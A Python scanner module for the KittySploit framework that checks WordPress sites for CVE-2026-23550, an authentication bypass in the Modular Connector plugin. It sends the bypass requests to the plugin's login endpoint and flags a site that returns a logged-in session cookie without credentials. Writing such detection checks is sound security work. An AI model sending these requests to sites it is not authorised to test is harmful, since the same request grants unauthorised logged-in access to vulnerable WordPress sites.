#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Modular DS - Broken Access Control"""

import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": 'Modular DS - Broken Access Control',
        "description": 'Modular Connector login endpoint issues wordpress_logged_in cookie without auth.',
        "author": ["KittySploit Team"],
        "severity": 'high',
        "cve": 'CVE-2026-23550',
        "tags": ['web', 'scanner', 'cve', 'cve2026', 'vuln', 'wordpress', 'wp-plugin', 'auth-bypass', 'modular-connector', 'vkev'],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 2,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "endpoints"],
            "cost": 1.0,
            "noise": 0.2,
            "value": 1.0,
        },
        "references": ['https://help.modulards.com/en/article/modular-ds-security-release-modular-connector-252-dm3mv0/', 'https://nvd.nist.gov/vuln/detail/CVE-2026-23550'],
    }

    def run(self):
        token = secrets.token_hex(3)
        for path in (
            f"/index.php/api/modular-connector/login/{token}/?origin=mo&type=foo",
            f"/api/modular-connector/login/{token}/?origin=mo&type=foo",
        ):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 302:
                continue
            set_cookie = "\n".join(
                v for k, v in r.headers.items() if k.lower() == "set-cookie"
            ).lower()
            # also check combined headers
            headers_blob = "\n".join(f"{k}: {v}" for k, v in r.headers.items()).lower()
            if "wordpress_logged_in" not in set_cookie and "wordpress_logged_in" not in headers_blob:
                continue
            self.set_info(
                severity="high",
                cve="CVE-2026-23550",
                reason="Modular Connector issued wordpress_logged_in cookie without credentials",
                path=path,
                confidence="high",
            )
            return True
        return False
